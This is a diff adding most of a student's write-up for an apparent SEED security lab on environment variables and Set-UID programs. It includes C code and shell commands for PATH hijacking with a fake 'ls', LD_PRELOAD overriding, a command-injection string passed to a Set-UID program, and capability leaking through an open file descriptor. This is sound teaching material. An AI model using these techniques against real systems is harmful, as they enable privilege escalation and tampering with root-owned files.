@@ -59,4 +59,192 @@ The first step is to compile and run it but no output is shown. This shows that 
 
 Foe the next task the line 'execve("/usr/bin/env", argv, NULL);' has the line changed to 'execve("/usr/bin/env", argv, environ);'. When this is done, the full list of envrionment variables is printed. Now that 'environ' is used instead of 'NULL' the child program now has the same environment as the parent.
 
-The next task instead of using 'execve()' a system call is used.
+The next task instead of using 'execve()' a system call is used. The program that is created and used is the following called task4.c:
+#include <stdio.h>
+#include <stdlib.h>
+int main()
+{
+    system("/usr/bin/env");
+    return 0 ;
+}
+
+
+Unlike the execve program the process automatically passes the environment to the child, and therefore prints all the EVs.
+
+The next task the program task5.c is created which prints the EVs using printf and interating through environ.
+task5.c
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **environ;
+int main()
+{
+    int i = 0;
+    while (environ[i] != NULL) {
+        printf("%s\n", environ[i]);
+        i++;
+    }
+}
+
+The output prints all the EVs in the current process.
+The next step is to change the programs ownership to root and make it a Set_UID program. to do so the following commands are used: 
+$ sudo chown root foo
+$ sudo chmod 4755 foo
+
+![alt text](task5Step2.png)
+
+we can see in the image that this is successful as we see rws on the owner permissions and to confirm by using the command './foo' to see the evs listed.
+
+The final step we log onto the normal user account 'sally' and edit/create some evs with the following commands:
+export PATH="/usr/local/bin:$PATH"
+export LD_LIBRARY_PATH="/tmp/mylibs"
+export MYVAR="hello_world"
+
+Running foo again we can see the outputs we want in the following pictures:
+
+![alt text](MYVAR.png)
+![alt text](PATH.png)
+
+The LD_LIBRARY_PATH variable isn't shown which seems to be a security feature in modern linux operating systems.
+
+The next task involves PATH EV and Set-UID programs, where the vulnerable program named ls_vuln.c is exploited.
+ls_vuln.c:
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(void) {
+    printf("real uid: %d, effective uid: %d\n", getuid(), geteuid());
+
+    system("ls");
+    return 0;
+}
+
+some lines of code are added to the provided code for verification.
+
+To make the program owned by root and Set-UID, the commands 'sudo chown root:root ls' and 'sudo chmod 4755 ls' .To verify we can log into a normal users account and run it as seen below.
+![alt text](lsVULNUID.png)
+
+/bin/sh is replaced with zsh according to the seed lab, ensure zsh is installed or you will run into problems.
+
+The malicious code ls is created to see if the vulnerable code runs it.
+ls:
+mkdir -p ~/malicious
+cat > ~/malicious/ls <<'EOF'
+echo "I am fake ls script"
+id
+EOF
+
+chmod +x ~/malicious/ls
+
+The directory is prepended to path using 'export PATH="$HOME/malicious:$PATH"'. When the ls_vuln.c program is ran now, we can see that the EUID is now 0 giving the code root privileges as seen below.
+![alt text](ROOTUID.png)
+
+The next task centered around the LD_PRELOAD EV and Set_UID programs using the program mylib.c.
+mylib.c:
+#include <stdio.h>
+void sleep (int s)
+{
+    /* If this is invoked by a privileged program,
+    you can do damages here! */
+    printf("I am not sleeping!\n");
+}
+
+To compile the program the following commands are used:
+gcc -fPIC -g -c mylib.c
+gcc -shared -o libmylib.so.1.0.1 mylib.o -lc
+
+Then set the LD_PRELOAD EV using the command 'export LD_PRELOAD=./libmylib.so.1.0.1'
+
+The program 'myprog.c' is created, compiled, and ran.
+The output would say "I am not sleeping!" as seen in the image below which means that the sleep() var from the library was loaded before system C library.
+myprog.c:
+#include <unistd.h>
+int main()
+{
+    sleep(1);
+    return 0;
+}
+
+![alt text](sleeping.png)
+
+When run as a normal program and user, it outputs as expected as the dynamic loader accepts the EV LD_PRELOAD settings, but when run as a Set_UID program, there is no output as the dynamic loader ignores potentially dangerous EVS. 
+When you switch over to either root or use sudo it works again as you have the necessary privileges.
+When the program is owned by a different user like bob and run by sally, it doesnt work still as they dont have the privileges.
+
+The next task will be comparing system() and execve() using the catall.c program.
+catall.c:
+int main(int argc, char *argv[])
+{
+    char *v[3];
+    char *command;
+    if(argc < 2) {
+        printf("Please type a file name.\n");
+        return 1;
+    }
+    v[0] = "/bin/cat"; v[1] = argv[1]; v[2] = NULL;
+    command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
+    sprintf(command, "%s %s", v[0], v[1]);
+
+    // Use only one of the followings.
+    system(command);
+    // execve(v[0], v, NULL);
+    return 0;
+}
+
+The program is compiled and made into a Set-UID. Before it is ran, a temporary file is created using the command 'echo "this is a public file" > /tmp/publicfile'.
+When run the command './catall /tmp/publicfile' and the output can be seen below.
+![alt text](catall1.png)
+
+This is fine but you can perform a command injection using the command './catall "/tmp/publicfile; echo HACKED"' which shows the following output:
+![alt text](catall1hack.png)
+
+This can compromise security as a user can cause additional commands to run under the programs privilege.
+
+The program is edited to use the execve command and the system command is commented out. when compiled and ran without the injection is outputs as expected as seen below
+![alt text](catall2.png)
+
+but when run with the same injection the following below is the output.
+![alt text](catall2hack.png)
+
+This shows that unlike with system, the execve does not inject the command and now doesnt work.
+
+The final task undertakes capability leaking. The program used is cap_leak.c.
+cap_leak.c:
+void main()
+{
+    int fd;
+    char *v[2];
+
+    /* Assume that /etc/zzz is an important system file,
+    * and it is owned by root with permission 0644.
+    * Before running this program, you should create
+    * the file /etc/zzz first. */
+    fd = open("/etc/zzz", O_RDWR | O_APPEND);
+    if (fd == -1) {
+        printf("Cannot open /etc/zzz\n");
+        exit(0);
+    }
+
+    // Print out the file descriptor value
+    printf("fd is %d\n", fd);
+    // Permanently disable the privilege by making the
+    // effective uid the same as the real uid
+    setuid(getuid());
+
+    // Execute /bin/sh
+    v[0] = "/bin/sh"; v[1] = 0;
+    execve(v[0], v, 0);
+}
+
+Like before a dummy/test file is created using the following command:
+sudo bash -c 'echo "ORIGINAL" > /etc/zzz && chmod 0644 /etc/zzz && chown root:root /etc/zzz'
+
+As before the code is given root as the owner and Set_UID.
+The program when run outputs "fd is 3" as it returns the test files descriptor. Now the process is running as an unprivileged user and get an interative prompt.
+Now while in this prompt we can write 'echo "appended by leak" >&3' then exit and when we check the file we can see that text inside of it as seen below:
+![alt text](task9.png)
+
+this shows that even though we are running it as a unprivileged user, we could still write to the zzz test file demonstrating capability leaking.
+
+This concludes ths lab and overall the tasks were a success as we were able to understand evs and Set-UID better and various attacks.
